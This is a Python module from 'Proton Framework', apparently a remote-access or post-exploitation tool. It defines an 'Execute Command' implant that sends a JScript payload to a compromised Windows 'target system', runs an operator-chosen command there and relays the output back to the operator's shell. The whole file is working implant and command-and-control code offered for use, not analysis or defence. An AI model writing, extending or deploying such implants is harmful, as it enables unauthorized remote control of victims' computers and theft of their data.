#!/usr/bin/env python3

#            ---------------------------------------------------
#                             Proton Framework              
#            ---------------------------------------------------
#                Copyright (C) <2019-2020>  <Entynetproject>
#
#        This program is free software: you can redistribute it and/or modify
#        it under the terms of the GNU General Public License as published by
#        the Free Software Foundation, either version 3 of the License, or
#        any later version.
#
#        This program is distributed in the hope that it will be useful,
#        but WITHOUT ANY WARRANTY; without even the implied warranty of
#        MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
#        GNU General Public License for more details.
#
#        You should have received a copy of the GNU General Public License
#        along with this program.  If not, see <http://www.gnu.org/licenses/>.

import core.job
import core.implant
import uuid

class ExecCmdJob(core.job.Job):
    def create(self):
        self.options.set("FCMD", self.options.get('CMD').replace("\\", "\\\\").replace('"', '\\"'))
        self.options.set("FDIRECTORY", self.options.get('DIRECTORY').replace("\\", "\\\\").replace('"', '\\"'))

    def report(self, handler, data, sanitize = False):
        self.results = self.decode_downloaded_data(data, handler.get_header("encoder", 1252), True).decode("cp"+handler.get_header("shellchcp", '437'))
        handler.reply(200)
        self.completed = 4
        self.done()

    def done(self):
        self.display()

    def display(self):
        self.shell.print_plain("Result for `%s`:" % self.options.get('CMD').replace('\\"', '"').replace("\\\\", "\\"))
        self.shell.print_plain(self.results)

class ExecCmdImplant(core.implant.Implant):

    NAME = "Execute Command"
    DESCRIPTION = "Executes a command on the target system."
    AUTHORS = ["Entynetproject"]
    STATE = "implant/manage/exec_cmd"

    def load(self):
        self.options.register("CMD", "ipconfig", "Command to execute.")
        self.options.register("OUTPUT", "true", "Retrieve output.", enum=["true", "false"])
        self.options.register("DIRECTORY", "%TEMP%", "Writeable directory.", required=False)
        self.options.register("FCMD", "", "Command after escaping.", hidden=True)
        self.options.register("FDIRECTORY", "", "Dir after escaping.", hidden=True)
        # self.options.register("FILE", "", "random uuid for file name", hidden=True)

    def job(self):
        return ExecCmdJob

    def run(self):
        
        payloads = {}
        #payloads["vbs"] = self.load_script("data/implant/manage/exec_cmd.vbs", self.options)
        payloads["js"] = "data/implant/manage/exec_cmd.js"

        self.dispatch(payloads, self.job)
